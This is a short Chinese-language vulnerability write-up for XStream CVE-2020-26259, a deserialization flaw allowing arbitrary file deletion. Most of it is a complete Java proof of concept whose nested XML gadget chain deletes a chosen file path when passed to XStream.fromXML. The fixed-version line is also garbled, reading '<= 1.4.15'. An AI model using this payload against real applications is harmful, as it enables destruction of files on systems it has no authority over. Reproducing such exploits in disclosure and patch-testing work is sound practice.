# XStream 任意文件删除 反序列化漏洞 CVE-2020-26259

## 漏洞描述

Xstream 是 Java 类库，用来将对象序列化成 XML (JSON) 或反序列化为对象。XStream 是一款开源软件，允许在 BSD 许可证的许可下分发。

参考链接：

- https://x-stream.github.io/CVE-2020-26259.html

## 漏洞影响

影响版本：

```
Xstream < = 1.4.14
```

修复版本：

```
Xstream < = 1.4.15
```

## 漏洞复现

poc：

```
import com.thoughtworks.xstream.XStream;

/*
CVE-2020-26259: XStream is vulnerable to an Arbitrary File Deletion on the local host
when unmarshalling as long as the executing process has sufficient rights.
https://x-stream.github.io/CVE-2020-26259.html
Security framework of XStream not explicitly initialized, using predefined black list on your own risk.
 */
 
public class CVE_2020_26259 {
    public static void main(String[] args) {
        String xml_poc = "<map>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
                "        <dataHandler>\n" +
                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "            <contentType>text/plain</contentType>\n" +
                "            <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>\n" +
                "              <tempFile>/tmp/CVE-2020-26259</tempFile>\n" +
                "            </is>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <string>test</string>\n" +
                "  </entry>\n" +
                "</map>";
        XStream xstream = new XStream();
        xstream.fromXML(xml_poc);
    }
}
```
